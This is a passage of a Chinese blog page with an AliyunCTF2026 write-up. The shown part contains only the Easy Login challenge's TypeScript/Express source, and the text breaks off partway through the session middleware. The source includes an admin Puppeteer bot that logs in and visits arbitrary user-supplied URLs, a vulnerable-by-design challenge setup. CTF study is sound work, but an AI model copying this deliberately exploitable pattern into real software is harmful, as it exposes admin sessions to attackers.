
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>AliyunCTF2026 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Login"><span class="toc-number">2.</span> <span class="toc-text">Easy Login</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-Auction"><span class="toc-number">3.</span> <span class="toc-text">Misc - Auction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cutter"><span class="toc-number">4.</span> <span class="toc-text">cutter</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>AliyunCTF2026</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2026/1/31
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">5.6k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">32分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201220549354.png"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91567">https://xz.aliyun.com/news/91567</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA">https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA</a></p>
<span id="more"></span>

<hr>
<h1 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h1><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">import</span> dotenv <span class="token keyword">from</span> <span class="token string">'dotenv'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> express<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> Request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> NextFunction <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> cookieParser <span class="token keyword">from</span> <span class="token string">'cookie-parser'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> MongoClient<span class="token punctuation">,</span> Db<span class="token punctuation">,</span> Collection <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongodb'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> crypto <span class="token keyword">from</span> <span class="token string">'crypto'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">'path'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> puppeteer <span class="token keyword">from</span> <span class="token string">'puppeteer'</span><span class="token punctuation">;</span>

dotenv<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> mongoUri <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_URI</span> <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_URL</span> <span class="token operator">||</span> <span class="token string">'mongodb://127.0.0.1:27017/easy_login'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> dbName <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">MONGO_DB_NAME</span> <span class="token operator">||</span> <span class="token string">'easy_login'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">||</span> <span class="token string">'flag&#123;dummy_flag_for_testing&#125;'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">||</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://127.0.0.1:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">ADMIN_PASSWORD</span> <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">UserDoc</span> <span class="token punctuation">&#123;</span>
  username<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  password<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">interface</span> <span class="token class-name">SessionDoc</span> <span class="token punctuation">&#123;</span>
  sid<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  username<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  createdAt<span class="token operator">:</span> Date<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">interface</span> <span class="token class-name">AuthedRequest</span> <span class="token keyword">extends</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>
  user<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">&#125;</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  collections<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    users<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>UserDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    sessions<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> db<span class="token operator">:</span> Db <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> usersCollection<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>UserDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> sessionsCollection<span class="token operator">:</span> Collection<span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> publicDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../public'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runXssVisit</span><span class="token punctuation">(</span>targetUrl<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> targetUrl <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'invalid target url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    headless<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    args<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span> <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token constant">APP_INTERNAL_URL</span> <span class="token operator">+</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      waitUntil<span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">,</span>
      timeout<span class="token operator">:</span> <span class="token number">15000</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> delay<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">,</span> <span class="token constant">ADMIN_PASSWORD</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> delay<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token builtin">Promise</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
      page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'#loginForm button[type="submit"]'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      page<span class="token punctuation">.</span><span class="token function">waitForResponse</span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span> timeout<span class="token operator">:</span> <span class="token number">10000</span> <span class="token punctuation">&#125;</span>
      <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">undefined</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>targetUrl<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> waitUntil<span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">,</span> timeout<span class="token operator">:</span> <span class="token number">15000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token builtin">Promise</span></span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">createSessionForUser</span><span class="token punctuation">(</span>user<span class="token operator">:</span> UserDoc<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sessionsCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'sessions collection not initialized'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> sid <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">await</span> sessionsCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    sid<span class="token punctuation">,</span>
    username<span class="token operator">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>
    createdAt<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> sid<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>publicDir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">initMongo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span>mongoUri<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  db <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">db</span><span class="token punctuation">(</span>dbName<span class="token punctuation">)</span><span class="token punctuation">;</span>
  usersCollection <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">collection</span><span class="token generic class-name"><span class="token operator">&lt;</span>UserDoc<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  sessionsCollection <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">collection</span><span class="token generic class-name"><span class="token operator">&lt;</span>SessionDoc<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'sessions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> adminUser <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>adminUser<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      username<span class="token operator">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>
      password<span class="token operator">:</span> <span class="token constant">ADMIN_PASSWORD</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">updateOne</span><span class="token punctuation">(</span>
      <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#123;</span> $set<span class="token operator">:</span> <span class="token punctuation">&#123;</span> password<span class="token operator">:</span> <span class="token constant">ADMIN_PASSWORD</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  adminUser <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[init] Admin password set to: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">ADMIN_PASSWORD</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sessionMiddleware</span><span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">,</span> next<span class="token operator">:</span> NextFunction<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> sid <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token operator">?.</span>sid <span class="token keyword">as</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sid <span class="token operator">||</span> <span class="token operator">!</span>sessionsCollection <span class="token operator">||</span> <span class="token operator">!</span>usersCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token keyword">await</span> sessionsCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> sid <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

